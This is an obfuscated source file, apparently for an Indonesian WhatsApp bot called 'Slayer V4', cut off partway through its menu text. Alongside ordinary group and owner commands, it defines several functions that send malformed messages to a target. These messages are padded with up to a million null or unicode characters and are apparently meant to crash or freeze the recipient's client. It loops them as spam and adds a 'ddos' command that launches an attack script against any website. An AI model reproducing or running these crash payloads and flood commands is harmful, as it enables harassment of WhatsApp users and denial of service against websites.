require("./config");
const {
  downloadContentFromMessage,
  makeInMemoryStore,
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType
} = require("@whiskeysockets/baileys");
const {
  isUrl,
  sleep,
  await,
  getGroupAdmins,
  fetchJson
} = require("./lib/myfunc.js");
const fs = require("fs");
const axios = require("axios");
const util = require("util");
const chalk = require("chalk");
const fetch = require("node-fetch");
const ms = require("parse-ms");
const {
  exec,
  spawn,
  execSync
} = require("child_process");
ownerNumberr = global.ownerNumber;
ownerNamee = global.ownerName;
botNamee = global.botName;
Leccy_Auto_Typing = global.Auto_Typing;
Leccy_Auto_Recording = global.Auto_Recording;
Leccy_Auto_RecordType = global.Auto_RecordType;
Leccy_Auto_ReadPesan = global.Auto_ReadPesan;
tiktokauto = global.TiktokAutoDownload;
let {
  leccybug
} = require("./lib/button");
const teks_proses = "_Your request is being processed⏳_";
let premium = JSON.parse(fs.readFileSync("./database/premium.json"));
const tbsm = fs.readFileSync("./lib/strava.jpg");
module.exports = async (_0x134739, _0x2cf499, _0x5144a5) => {
  try {
    const {
      fromMe: _0x2643a3,
      isBaileys: _0x1833e3,
      isQuotedMsg: _0x1a7991,
      quotedMsg: _0x15f767,
      mentioned: _0x5a5414
    } = _0x2cf499;
    if (_0x2cf499.key && _0x2cf499.key.remoteJid === "status@broadcast") {
      return;
    }
    const _0x12930e = getContentType(_0x2cf499.message);
    const _0x38a7dd = JSON.stringify(_0x2cf499.message);
    const _0x1688e9 = _0x2cf499.key.remoteJid;
    const _0x230d2f = _0x12930e == "extendedTextMessage" && _0x2cf499.message.extendedTextMessage.contextInfo != null ? _0x2cf499.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
    const _0x4a11ea = _0x12930e === "conversation" && _0x2cf499.message.conversation ? _0x2cf499.message.conversation : _0x12930e == "imageMessage" && _0x2cf499.message.imageMessage.caption ? _0x2cf499.message.imageMessage.caption : _0x12930e == "documentMessage" && _0x2cf499.message.documentMessage.caption ? _0x2cf499.message.documentMessage.caption : _0x12930e == "videoMessage" && _0x2cf499.message.videoMessage.caption ? _0x2cf499.message.videoMessage.caption : _0x12930e == "extendedTextMessage" && _0x2cf499.message.extendedTextMessage.text ? _0x2cf499.message.extendedTextMessage.text : _0x12930e == "buttonsResponseMessage" && _0x2cf499.message.buttonsResponseMessage.selectedButtonId ? _0x2cf499.message.buttonsResponseMessage.selectedButtonId : _0x12930e == "templateButtonReplyMessage" && _0x2cf499.message.templateButtonReplyMessage.selectedId ? _0x2cf499.message.templateButtonReplyMessage.selectedId : "";
    const _0x2d7522 = _0x12930e === "conversation" && _0x2cf499.message.conversation ? _0x2cf499.message.conversation : _0x12930e === "imageMessage" && _0x2cf499.message.imageMessage.caption ? _0x2cf499.message.imageMessage.caption : _0x12930e === "videoMessage" && _0x2cf499.message.videoMessage.caption ? _0x2cf499.message.videoMessage.caption : _0x12930e === "extendedTextMessage" && _0x2cf499.message.extendedTextMessage.text ? _0x2cf499.message.extendedTextMessage.text : _0x12930e === "buttonsResponseMessage" && _0x15f767.fromMe && _0x2cf499.message.buttonsResponseMessage.selectedButtonId ? _0x2cf499.message.buttonsResponseMessage.selectedButtonId : _0x12930e === "templateButtonReplyMessage" && _0x15f767.fromMe && _0x2cf499.message.templateButtonReplyMessage.selectedId ? _0x2cf499.message.templateButtonReplyMessage.selectedId : _0x12930e === "messageContextInfo" ? _0x2cf499.message.buttonsResponseMessage?.selectedButtonId || _0x2cf499.message.listResponseMessage?.singleSelectReply.selectedRowId : _0x12930e == "listResponseMessage" && _0x15f767.fromMe && _0x2cf499.message.listResponseMessage.singleSelectReply.selectedRowId ? _0x2cf499.message.listResponseMessage.singleSelectReply.selectedRowId : "";
    const _0x537231 = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(_0x4a11ea) ? _0x4a11ea.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : ".";
    const _0x463704 = _0x4a11ea.replace(_0x537231, "").trim().split(/ +/).shift().toLowerCase();
    const _0x66dd87 = _0x4a11ea.trim().split(/ +/).slice(1);
    const _0x2907c4 = _0x66dd87.join(" ");
    const _0x1e745b = q = _0x66dd87.join(" ");
    const _0x5ed51d = _0x1688e9.endsWith("@g.us");
    const _0x3c5b6d = _0x134739.user.id.split(":")[0];
    const _0x565577 = _0x2cf499.key.fromMe ? _0x134739.user.id.split(":")[0] + "@s.whatsapp.net" || _0x134739.user.id : _0x2cf499.key.participant || _0x2cf499.key.remoteJid;
    const _0x2eac82 = _0x565577.split("@")[0];
    const _0x1d5371 = _0x2cf499.pushName || "" + _0x2eac82;
    const _0x53b0d4 = _0x3c5b6d.includes(_0x2eac82);
    const _0x1be9bd = [global.ownerNumber, ...premium].includes(_0x2eac82);
    const _0x446185 = global.ownerNumber.includes(_0x2eac82);
    const _0x540fdf = _0x3c5b6d.includes(_0x2eac82);
    const _0x3fd1c2 = _0x5ed51d ? await _0x134739.groupMetadata(_0x1688e9) : "";
    const _0x547d75 = _0x5ed51d ? _0x3fd1c2.subject : "";
    const _0x506623 = _0x5ed51d ? _0x3fd1c2.id : "";
    const _0x1a4f5e = _0x5ed51d ? _0x3fd1c2.participants : "";
    const _0x1a01eb = _0x5ed51d ? getGroupAdmins(_0x1a4f5e) : "";
    const _0x868551 = _0x1a01eb.includes(_0x3c5b6d + "@s.whatsapp.net") || false;
    const _0x380b2e = _0x1a01eb.includes(_0x565577) || false;
    const _0x5dae40 = function (_0xab188a) {
      var _0xab188a = Number(_0xab188a);
      var _0x424bcf = Math.floor(_0xab188a / 86400);
      var _0x91d493 = Math.floor(_0xab188a % 86400 / 3600);
      var _0x43e9fc = Math.floor(_0xab188a % 3600 / 60);
      var _0x55559e = Math.floor(_0xab188a % 60);
      var _0x1f1c4e = _0x424bcf > 0 ? _0x424bcf + (_0x424bcf == 1 ? " Hari, " : " Hari, ") : "";
      var _0x1c7b93 = _0x91d493 > 0 ? _0x91d493 + (_0x91d493 == 1 ? " Jam, " : " Jam, ") : "";
      var _0x249e14 = _0x43e9fc > 0 ? _0x43e9fc + (_0x43e9fc == 1 ? " Menit, " : " Menit, ") : "";
      var _0x400b30 = _0x55559e > 0 ? _0x55559e + (_0x55559e == 1 ? " Detik" : " Detik") : "";
      return _0x1f1c4e + _0x1c7b93 + _0x249e14 + _0x400b30;
    };
    const _0x5e7e2d = _0x100dbf => {
      let _0x2edf57 = "";
      const _0x3912f3 = "1234567890";
      const _0x5a05d9 = _0x3912f3.length;
      for (let _0xefa5b2 = 0; _0xefa5b2 < _0x100dbf; _0xefa5b2++) {
        _0x2edf57 += _0x3912f3.charAt(Math.floor(Math.random() * _0x5a05d9));
      }
      return _0x2edf57;
    };
    const _0x3f4b84 = async _0x2c55f5 => {
      return JSON.stringify(_0x2c55f5, null, 2);
    };
    const _0xf2a0fa = {
      key: {
        fromMe: true,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: {
        listResponseMessage: {
          title: "MarkZuckerberg"
        }
      }
    };
    const _0x397878 = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: {
        extendedTextMessage: {
          text: "" + _0x5dae40(process.uptime())
        }
      }
    };
    const _0x2c90b0 = async _0x5e08d9 => {
      await _0x134739.sendMessage(_0x1688e9, {
        text: _0x5e08d9
      }, {
        quoted: _0x2cf499
      });
    };
    const _0x47ea42 = async _0x3f2c93 => {
      _0x134739.sendMessage(_0x1688e9, {
        text: _0x3f2c93
      }, {
        quoted: _0x2cf499
      });
    };
    const _0x417a71 = async _0x298979 => {
      _0x134739.sendMessage(_0x1688e9, {
        react: {
          text: _0x298979,
          key: _0x2cf499.key
        }
      });
    };
    const _0x1214e9 = async (_0x1ec2c6, _0x2c8102) => {
      _0x134739.sendMessage(_0x565577, {
        video: {
          url: _0x1ec2c6
        },
        caption: _0x2c8102
      }, {
        quoted: _0x2cf499
      });
    };
    const _0x4366e1 = async _0x447b80 => {
      _0x134739.sendMessage(_0x1688e9, {
        image: tbsm,
        caption: _0x447b80,
        contextInfo: {
          mentionedJid: [_0x565577],
          forwardingScore: 9999,
          isForwarded: true
        }
      }, {
        quoted: _0x2cf499
      });
    };
    const _0x3e9b97 = async (_0x536b95, _0x239cf7) => {
      _0x134739.sendMessage(_0x565577, {
        image: {
          url: _0x536b95
        },
        caption: _0x239cf7
      }, {
        quoted: _0x2cf499
      });
    };
    const _0x1446df = async (_0x104f06, _0xa6004d) => {
      _0x134739.sendMessage(_0x565577, {
        document: {
          url: _0x104f06
        },
        fileName: _0xa6004d + ".mp3",
        mimetype: "audio/mp3"
      }, {
        quoted: _0x2cf499
      });
    };
    async function _0x464df8(_0x41465c) {
      var _0x4beebe = generateWAMessageFromContent(_0x41465c, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                subtitle: " "
              },
              body: {
                text: "ຮ₮ཞศV꙰ศ ๖ມG꙰"
              },
              footer: {
                text: "›#lordemperor"
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{ display_text : 'ຮ₮ཞศV꙰ศ ๖ມG꙰', url : , merchant_url :  }"
                }],
                messageParamsJson: "\0".repeat(1000000)
              }
            }
          }
        }
      }), {
        userJid: _0x41465c
      });
      await _0x134739.relayMessage(_0x41465c, _0x4beebe.message, {
        participant: {
          jid: _0x41465c
        },
        messageId: _0x4beebe.key.id
      });
    }
    async function _0x46e68b(_0xbf9a52) {
      var _0xdd8bc8 = generateWAMessageFromContent(_0xbf9a52, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                subtitle: " "
              },
              body: {
                text: "ຮ₮ཞศV꙰ศ ๖ມG꙰"
              },
              footer: {
                text: "›#lordemperor"
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{ display_text : 'ຮ₮ཞศV꙰ศ ๖ມG꙰', url : , merchant_url :  }"
                }],
                messageParamsJson: "\0".repeat(1000000)
              }
            }
          }
        }
      }), {
        userJid: _0xbf9a52
      });
      await _0x134739.relayMessage(_0xbf9a52, _0xdd8bc8.message, {
        messageId: _0xdd8bc8.key.id
      });
    }
    async function _0x1e9fad(_0x162a9a) {
      var _0x27f514 = generateWAMessageFromContent(_0x162a9a, proto.Message.fromObject({
        listMessage: {
          title: "⟠⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々" + "\0".repeat(920000),
          footerText: "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
          description: "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
          buttonText: null,
          listType: 2,
          productListInfo: {
            productSections: [{
              title: "anjay",
              products: [{
                productId: "4392524570816732"
              }]
            }],
            productListHeaderImage: {
              productId: "4392524570816732",
              jpegThumbnail: null
            },
            businessOwnerJid: "0@s.whatsapp.net"
          }
        },
        footer: "puki",
        contextInfo: {
          expiration: 604800,
          ephemeralSettingTimestamp: "1679959486",
          entryPointConversionSource: "global_search_new_chat",
          entryPointConversionApp: "whatsapp",
          entryPointConversionDelaySeconds: 9,
          disappearingMode: {
            initiator: "INITIATED_BY_ME"
          }
        },
        selectListType: 2,
        product_header_info: {
          product_header_info_id: 292928282928,
          product_header_is_rejected: false
        }
      }), {
        userJid: _0x162a9a
      });
      await _0x134739.relayMessage(_0x162a9a, _0x27f514.message, {
        participant: {
          jid: _0x162a9a
        },
        messageId: _0x27f514.key.id
      });
    }
    async function _0xcd357(_0x2489bb) {
      var _0x343ba7 = generateWAMessageFromContent(_0x2489bb, proto.Message.fromObject({
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          mimetype: "penis",
          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          fileLength: "999999999",
          pageCount: 999999999,
          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          fileName: "؂ن؃؄ٽ؂ن؃؄ٽ" + "ྦྷ".repeat(60000),
          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1715880173"
        }
      }), {
        userJid: _0x2489bb
      });
      await _0x134739.relayMessage(_0x2489bb, _0x343ba7.message, {
        participant: {
          jid: _0x2489bb
        },
        messageId: _0x343ba7.key.id
      });
    }
    async function _0xb49bd6(_0x1bc6ae) {
      var _0x1bfd13 = generateWAMessageFromContent(_0x1bc6ae, proto.Message.fromObject({
        interactiveMessage: {
          header: {
            title: ".",
            hasMediaAttachment: true,
            ...(await prepareWAMessageMedia({
              image: {
                url: "https://telegra.ph/file/3a0e8f01cbcc9d1858168.jpg"
              }
            }, {
              upload: _0x134739.waUploadToServer
            }))
          },
          body: {
            text: ""
          },
          footer: {
            text: "›#lordemperor"
          },
          nativeFlowMessage: {
            messageParamsJson: "\0؂ن؃؄ٽ؂ن؃؄ٽ".repeat(1000000)
          }
        }
      }), {
        userJid: _0x1bc6ae
      });
      await _0x134739.relayMessage(_0x1bc6ae, _0x1bfd13.message, {
        participant: {
          jid: _0x1bc6ae
        },
        messageId: _0x1bfd13.key.id
      });
    }
    async function _0x596236(_0x24134d) {
      var _0x2ef26c = generateWAMessageFromContent(_0x24134d, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "p",
              degreesLongitude: "p",
              caption: "؂ن؃؄ٽ؂ن؃؄ٽ" + "ꦾ".repeat(50000),
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: _0x24134d
      });
      await _0x134739.relayMessage(_0x24134d, _0x2ef26c.message, {
        participant: {
          jid: _0x24134d
        },
        messageId: _0x2ef26c.key.id
      });
    }
    async function _0xf48c5a(_0x18fb75) {
      _0x134739.relayMessage(_0x18fb75, {
        extendedTextMessage: {
          text: ".",
          contextInfo: {
            stanzaId: _0x18fb75,
            participant: _0x18fb75,
            quotedMessage: {
              conversation: "؂ن؃؄ٽ؂ن؃؄ٽ" + "ꦾ".repeat(50000)
            },
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING"
            }
          },
          inviteLinkGroupTypeV2: "DEFAULT"
        }
      }, {
        participant: {
          jid: _0x18fb75
        }
      }, {
        messageId: null
      });
    }
    async function _0x17081d(_0x4310b8) {
      _0x134739.relayMessage(_0x4310b8, {
        paymentInviteMessage: {
          serviceType: "UPI",
          expiryTimestamp: Date.now() + 86400000
        }
      }, {
        participant: {
          jid: _0x4310b8
        }
      });
    }
    async function _0x3410cb(_0x4437be) {
      await _0x134739.relayMessage(_0x4437be, {
        paymentInviteMessage: {
          serviceType: "FBPAY",
          expiryTimestamp: Date.now() + 1814400000
        }
      }, {
        participant: {
          jid: _0x4437be
        }
      });
    }
    async function _0x10a4dd(_0x12d82d, _0x3639c5) {
      for (let _0x4cccd2 = 0; _0x4cccd2 < _0x3639c5; _0x4cccd2++) {
        _0x17081d(_0x12d82d);
        _0x3410cb(_0x12d82d);
        _0xf48c5a(_0x12d82d);
        await sleep(500);
      }
    }
    async function _0x4c4452(_0x20974a, _0x1403dd) {
      for (let _0x169cee = 0; _0x169cee < _0x1403dd; _0x169cee++) {
        _0x46e68b(_0x20974a);
        await sleep(500);
      }
    }
    async function _0x14fb3d(_0x1a0c29, _0xe6dc89) {
      for (let _0x4fd8d7 = 0; _0x4fd8d7 < _0xe6dc89; _0x4fd8d7++) {
        _0x1e9fad(_0x1a0c29);
        _0x596236(_0x1a0c29);
        _0x464df8(_0x1a0c29);
        await sleep(500);
      }
    }
    function _0x3fee19(_0x17b30e, _0x3dd9e0 = [], _0x49d089) {
      if (_0x49d089 == null || _0x49d089 == undefined || _0x49d089 == false) {
        let _0x36b87b = _0x134739.sendMessage(_0x1688e9, {
          text: _0x17b30e,
          mentions: _0x3dd9e0
        }, {
          quoted: _0x2cf499
        });
        return _0x36b87b;
      } else {
        let _0x4aa029 = _0x134739.sendMessage(_0x1688e9, {
          text: _0x17b30e,
          mentions: _0x3dd9e0
        }, {
          quoted: _0x2cf499
        });
        return _0x4aa029;
      }
    }
    if (Leccy_Auto_Typing) {
      _0x134739.sendPresenceUpdate("composing", _0x1688e9);
    }
    if (Leccy_Auto_Recording) {
      _0x134739.sendPresenceUpdate("recording", _0x1688e9);
    }
    if (Leccy_Auto_ReadPesan) {
      _0x134739.readMessages([_0x2cf499.key]);
    }
    if (_0x5ed51d) {
      console.log(chalk.bgBlack(chalk.redBright("\n===========================================\n")));
      console.log(chalk.black(chalk.white("Group Chat :")));
      console.log(chalk.black(chalk.cyan("- Message :")), chalk.black(chalk.greenBright(_0x4a11ea || _0x12930e)) + "\n" + chalk.magenta("- From :"), chalk.green(_0x2cf499.pushName), chalk.yellow(_0x565577.split("@")[0]) + "\n" + chalk.blueBright("=> in"), chalk.green(_0x547d75, _0x1688e9));
    } else {
      console.log(chalk.bgBlack(chalk.redBright("\n===========================================\n")));
      console.log(chalk.black(chalk.white("Private Chat :")));
      console.log(chalk.bgBlack(chalk.cyan("- Message :")), chalk.black(chalk.greenBright(_0x4a11ea || _0x12930e)) + "\n" + chalk.magenta("- From :"), chalk.green(_0x2cf499.pushName), chalk.yellow(_0x565577.split("@")[0]) + "\n");
    }
    switch (_0x463704) {
      case "stopjadibot":
        if (!_0x446185 && !_0x540fdf && !_0x1be9bd) {
          return _0x2c90b0("*Khusus Member Premium/Owner*");
        }
        if (!fs.existsSync("./database/jadibot/" + _0x565577.split("@")[0])) {
          return _0x2c90b0("*Maaf, Kamu Tidak Terdaftar Jadibot!*");
        }
        exec("rm -r database/jadibot/" + _0x565577.split("@")[0]);
        _0x2c90b0("*succesfully delete session ✓*");
        break;
      case "resetjadibot":
        if (!_0x446185 && !_0x540fdf) {
          return _0x2c90b0("Fitur ini Khusus Owner/Dev");
        }
        exec("rm -r database/jadibot/" + _0x565577.split("@")[0]);
        _0x2c90b0("*succesfully restart session ✓*");
        await sleep(3000);
        process.exit();
        break;
      case "listjadibot":
        if (!_0x446185 && !_0x540fdf) {
          return _0x2c90b0("*Khusus Member Premium/Owner*");
        }
        const {
          jadibot: _0x58774c,
          conns: _0x56fd88
        } = require("./lib/jadibot");
        try {
          let _0x22b331 = [...new Set([...global.conns.filter(_0x5af774 => _0x5af774.user).map(_0x1a90d2 => _0x1a90d2.user)])];
          te = "*List Jadibot*\n\n";
          for (let _0x2fd735 of _0x22b331) {
            y = await _0x134739.decodeJid(_0x2fd735.id);
            te += " • Users : @" + y.split("@")[0] + "\n";
            te += " • Time Aktif : " + _0x2fd735.time + "\n\n";
          }
          _0x134739.sendMessage(_0x1688e9, {
            text: te,
            mentions: [y]
          }, {
            quoted: _0x2cf499
          });
        } catch (_0x811b7c) {
          _0x2c90b0("Belum Ada User Yang Jadibot");
        }
        break;
      case "jadibot":
        {
          if (!_0x446185 && !_0x540fdf && !_0x1be9bd) {
            return _0x2c90b0("*Khusus Member Premium/Owner*");
          }
          if (_0x5ed51d) {
            return _0x2c90b0("Maaf Kak Fitur Ini Hanya Bisa Digunakan Dichat Pribadi!");
          }
          botku = _0x565577.split("@")[0];
          num = botku.replace(/[^0-9]/g, "");
          own = global.ownerBot;
          mynum = num + "@s.whatsapp.net";
          if (fs.existsSync("./database/jadibot/" + _0x565577.split("@")[0])) {
            return _0x3fee19("*mohon maaf* @" + _0x565577.split("@")[0] + " ^_^\n*session kamu masih terdaftar.*\n\n*silahkan ketik* .stopjadibot\n*untuk menghapus session ✓*", [mynum]);
          }
          _0x2c90b0("*We are processing your request.*");
          const {
            jadibot: _0x37a716,
            conns: _0x42b667
          } = require("./lib/jadibot");
          _0x37a716(_0x134739, num, _0x2c90b0, own);
          let _0x4fa6c4 = "`";
          await sleep(3500);
          _0x2c90b0("*MASUKKAN CODE PAIRING DIBAWAH INI*\n*UNTUK MENJADI BOT SEMENTARA ✓*\n\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk perangkat tertaut\n3. Ketuk tautkan perangkat\n4. Ketuk tautkan dengan nomor telepon saja\n5. Masukkan code pairing dibawah ini\n\n*Code Pairing :* `" + global.codepairing + "`\n\n*Note:*\n_Code dapat expired kapan saja._\n_Jika code error silahkan ketik_ ⇩\n\n========[  !stopjadibot  ]========");
        }
        break;
      case "ddos":
      case "mix":
        {
          if (!_0x446185 && !_0x540fdf) {
            return _0x2c90b0("Fitur ini Khusus Owner/Dev");
          }
          if (!q.includes(" ")) {
            return _0x2c90b0("Use Methode: ." + _0x463704 + " <target> <time>\nExaple: ." + _0x463704 + " example.my.id 60");
          }
          const _0x46e8ce = q.substring(0, q.indexOf(" ") - 0);
          const _0x540f18 = q.substring(q.lastIndexOf(" ") + 1);
          _0x2c90b0("*Attack Website Telah Berhasil Dilakukan ✓*\n• *Target* : " + _0x46e8ce + "\n• *Time Attack* : " + _0x540f18);
          exec("node lib/ddos.js " + _0x46e8ce + " " + _0x540f18, {
            maxBuffer: 1048576
          }, (_0x596cc9, _0x4e3550, _0x35bab1) => {
            if (_0x596cc9) {
              _0x2c90b0("Error: " + _0x596cc9.message);
              return;
            }
            if (_0x35bab1) {
              _0x2c90b0("Error: " + _0x35bab1);
              return;
            }
            _0x2c90b0("Success\n\n• Target: " + _0x46e8ce + ",\n• Time: " + _0x540f18);
          });
        }
        break;
      case "block":
        if (!_0x446185 && !_0x540fdf) {
          return _0x2c90b0("Fitur ini Khusus Owner/Dev");
        }
        blockw = q.replace(/[^0-9]/g, "");
        let _0x1971e5 = await _0x134739.onWhatsApp(blockw + "@s.whatsapp.net");
        if (_0x1971e5.length == 0) {
          return _0x2c90b0("_Enter A Valid And Registered Number On WhatsApp!!_");
        }
        let _0x225eb1 = blockw + "@s.whatsapp.net";
        await _0x134739.updateBlockStatus(_0x225eb1, "block").then(_0x4e4995 => _0x2c90b0(_0x3f4b84(_0x4e4995))).catch(_0x1a24f9 => _0x2c90b0(_0x3f4b84(_0x1a24f9)));
        break;
      case "unblock":
        if (!_0x446185 && !_0x540fdf) {
          return _0x2c90b0("Fitur ini Khusus Owner/Dev");
        }
        blockww = q.replace(/[^0-9]/g, "");
        let _0x18e7ea = await _0x134739.onWhatsApp(blockww + "@s.whatsapp.net");
        if (_0x18e7ea.length == 0) {
          return _0x2c90b0("_Enter A Valid And Registered Number On WhatsApp!!_");
        }
        let _0x2ab895 = blockww + "@s.whatsapp.net";
        await _0x134739.updateBlockStatus(_0x2ab895, "unblock").then(_0xe32a8d => _0x2c90b0(_0x3f4b84(_0xe32a8d))).catch(_0x1557af => _0x2c90b0(_0x3f4b84(_0x1557af)));
        break;
      case "leave":
        if (!_0x446185 && !_0x540fdf) {
          return _0x2c90b0("Fitur ini Khusus Owner/Dev");
        }
        if (!_0x5ed51d) {
          return _0x2c90b0("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
        }
        _0x2c90b0("Bye Everyone.");
        await _0x134739.groupLeave(_0x1688e9);
        break;
      case "shutdown":
        if (!_0x446185 && !_0x540fdf) {
          return _0x2c90b0("Fitur ini Khusus Owner/Dev");
        }
        _0x2c90b0("Goodbye🖐");
        await sleep(3000);
        process.exit();
        break;
      case "restart":
        if (!_0x446185 && !_0x540fdf) {
          return _0x2c90b0("Fitur ini Khusus Owner/Dev");
        }
        _0x2c90b0("In Process...");
        exec("pm2 restart all");
        break;
      case "listprem":
        {
          if (!_0x446185 && !_0x540fdf) {
            return _0x2c90b0("Fitur ini Khusus Owner/Dev");
          }
          let _0x4fc154 = JSON.parse(fs.readFileSync("./database/premium.json"));
          if (_0x4fc154.length == 0) {
            return _0x2c90b0("_Tidak Ada Users Premium!!_");
          }
          var _0x8a8953 = "_*LIST USER PREMIUM*_\n*Total User :* " + premium.length + "\n\n";
          var _0x31d493 = 1;
          for (let _0x4f71c9 of _0x4fc154) {
            _0x8a8953 += "User : " + _0x31d493++ + "\nNumber : @" + _0x4f71c9 + "\n\n";
          }
          _0x134739.sendTextWithMentions(_0x1688e9, _0x8a8953, _0x2cf499);
        }
        break;
      case "addprem":
        if (!_0x446185 && !_0x540fdf) {
          return _0x2c90b0("Fitur ini Khusus Owner/Dev");
        }
        if (!_0x66dd87[0]) {
          return _0x2c90b0("Use " + (_0x537231 + _0x463704) + " number\nExample " + (_0x537231 + _0x463704) + " 628xxxxxxxx");
        }
        bnnd = q.replace(/[^0-9]/g, "");
        let _0x40e98b = await _0x134739.onWhatsApp(bnnd + "@s.whatsapp.net");
        if (_0x40e98b.length == 0) {
          return _0x2c90b0("_Enter A Valid And Registered Number On WhatsApp!!_");
        }
        if (premium.includes(bnnd)) {
          return _0x2c90b0("_Nomor Tersebut Sudah Premium !!_");
        }
        premium.push(bnnd);
        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
        let _0x4620ef = bnnd + "@s.whatsapp.net";
        _0x3fee19("*Sukses Menambahkan " + _0x4620ef.split("@")[0] + " Ke Database Users Premium*", [_0x4620ef]);
        break;
      case "delprem":
        if (!_0x446185 && !_0x540fdf) {
          return _0x2c90b0("Fitur ini Khusus Owner/Dev");
        }
        if (!_0x66dd87[0]) {
          return _0x2c90b0("Use " + (_0x537231 + _0x463704) + " number\nExample " + (_0x537231 + _0x463704) + " 628xxxxx");
        }
        ya = q.replace(/[^0-9]/g, "");
        unp = premium.indexOf(ya);
        if (!premium.includes(ya)) {
          return _0x2c90b0("_Gagal Menghapus Dari Database, Nomor Tersebut Bukan Users Premium!!_");
        }
        premium.splice(unp, 1);
        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
        let _0xa97c00 = ya + "@s.whatsapp.net";
        _0x3fee19("*Sukses Menghapus " + _0xa97c00.split("@")[0] + " Didatabase Users Premium*", [_0xa97c00]);
        break;
      case "stv":
      case "menu":
        {
          aa = "```";
          bb = "`";
          penislu = fs.readFileSync("./index.js").toString();
          matches = penislu.match(/case '[^']+'(?!.*case '[^']+')/g) || [];
          countcs = matches.length;
          let _0xc7600 = countcs;
          txt = "▱▰▱「 𝐒𝐋𝐀𝐘𝐄𝐑 𝐕4 」▱▰▱\n╭──────────────────\n│ *Botname* : " + global.botName + "\n│ *Ownername* : " + global.ownerName + "\n│ *Pengguna* : " + (_0x446185 ? "Owner" : "User") + "\n│ *Total Fitur* : 100+\n│ *Number* : @" + _0x565577.split("@")[0] + "\n╰──────────────────\n┏❐ " + bb + "SIMPLE MENU" + bb + " ❐\n┃⭔.allmenu\n┃⭔.bugmenu\n┃⭔.ownermenu\n┃⭔.panelmenu\n┃⭔.jadibotmenu\n┃⭔.groupmenu\n┗❐\n▬▭▬▭▬▭▬▭▬▭\n 「 *RUNTIME BOT* 」\n" + _0x5dae40(process.uptime()) + "\n▬▭▬▭▬▭▬▭▬▭▬▭";
          _0x4366e1(txt);
        }
        break;
      case "allmenu":
      case "bugmenu":
      case "ownermenu":
      case "groupmenu":
      case "panelmenu":
      case "jadibotmenu":
        {
          aa = "```";
          bb = "`";
          txt1 = "▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "OWNER MENU" + bb + " ❐\n┃⭔.leave\n┃⭔.restart\n┃⭔.listprem\n┃⭔.shutdown\n┃⭔.join <linkgrup>\n┃⭔.block number\n┃⭔.unblock number\n┃⭔.delprem number\n┃⭔.addprem number\n┃⭔.mix <link> <time>\n┃⭔.ddos <link> <time>\n┃\n┗❐「 *sbotsv3.4* 」\n▬▭▬▭▬▭▬▭▬▭";
          txt2 = "▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "JADIBOT MENU" + bb + " ❐\n┃⭔.stopjadibot\n┃⭔.resetjadibot\n┃⭔.listjadibot\n┃⭔.jadibot\n┃\n┗❐「 *sbotsv3.4* 」\n▬▭▬▭▬▭▬▭▬▭";
          txt3 = "▬▭▬▭▬▭▬▭▬▭▬\n┏❐ " + bb + "GROUP MENU" + bb + " ❐\n┃⭔.open\n┃⭔.close\n┃⭔.linkgc\n┃⭔.linkgrup\n┃⭔.revoke\n┃⭔.hidetag teks\n┃⭔.kick @tag\n┃⭔.promote @tag\n┃⭔.demote @tag\n┃⭔.setname teks\n┃⭔.setdesc teks\n┃⭔.editinfo teks\n┃\n┗❐「 *sbotsv3.4* 」\n▬▭▬▭▬▭▬▭▬▭";
